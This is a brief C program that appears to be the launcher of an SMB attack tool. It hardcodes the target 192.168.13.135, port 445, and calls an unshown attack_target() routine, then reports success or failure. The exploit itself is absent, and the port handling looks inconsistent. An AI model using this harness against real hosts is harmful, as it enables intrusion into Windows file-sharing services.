#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <conio.h>

#include "global.h"
#include "attack.h"

int main(int args, char *argv[])
{
    TARGET_DESC targetDesc;

    memset(&targetDesc, 0x00, sizeof(targetDesc));

    chdir("test_lib\\");
    //printf("current working directory: %s\n", getcwd(NULL, NULL));

    /*
    if(args != 3)
    {
        printf("Incorrect parameter input.");
        return -1;
    }
    if(strlen(argv[1]) >= sizeof(targetDesc.ip) || strlen(argv[2]) > 5)
    {
        printf("Incorrect parameter input.");
        return -2;
    }
    strcat(targetDesc.ip, argv[1]);
    targetDesc.port = atoi(argv[2]);
    */
    strcat(targetDesc.ip, "192.168.13.135");
    strcat(targetDesc.port, "445");
    strcat(targetDesc.proto, "SMB");

    if(attack_target(&targetDesc, RETRY_COUNT) == 0)
    {
        printf("[+] Attack Succeeded!\n");
    }
    else
    {
        printf("[-] Attack Failed!\n");
    }
    getch();

    return 0;
}
